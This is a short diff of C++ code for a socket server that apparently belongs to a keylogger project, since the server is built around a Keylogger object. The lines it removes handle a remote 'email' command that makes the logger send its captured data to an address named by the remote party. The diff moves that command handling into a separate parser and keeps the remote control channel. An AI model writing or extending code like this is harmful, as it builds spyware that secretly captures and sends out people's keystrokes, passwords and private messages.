@@ -30,20 +30,6 @@ void SocketServer::initHostInfo() {
 	this->ip = ip;
 }
 
-std::vector<std::string> SocketServer::parseRequest(std::string request) {
-	std::vector<std::string> tokens;
-	std::regex separator(" ");
-
-	//start/end points of tokens in str
-	std::sregex_token_iterator
-		begin(request.begin(), request.end(), separator, -1),
-		end;
-
-	std::copy(begin, end, std::back_inserter(tokens));
-
-	return tokens;
-}
-
 SocketServer::SocketServer(Keylogger* logger) {
 	listenSocket = INVALID_SOCKET;
 
@@ -150,19 +136,7 @@ void SocketServer::start() {
 }
 
 std::string SocketServer::getResponse(std::string request) {
-	std::stringstream responseStream;
-
-	auto tokens = this->parseRequest(request);
-
-	if (tokens[0] == "email") {
-		auto emailTo = tokens.size() >= 2 ? tokens[1] : "";
-		bool success = logger->sendEmailCallback(emailTo);
-		responseStream << success;
-	} else {
-		responseStream << request << " ok";
-	}
-
-	return responseStream.str();
+	return CommandParser::act(request);
 }
 
 std::string SocketServer::getHostName() {
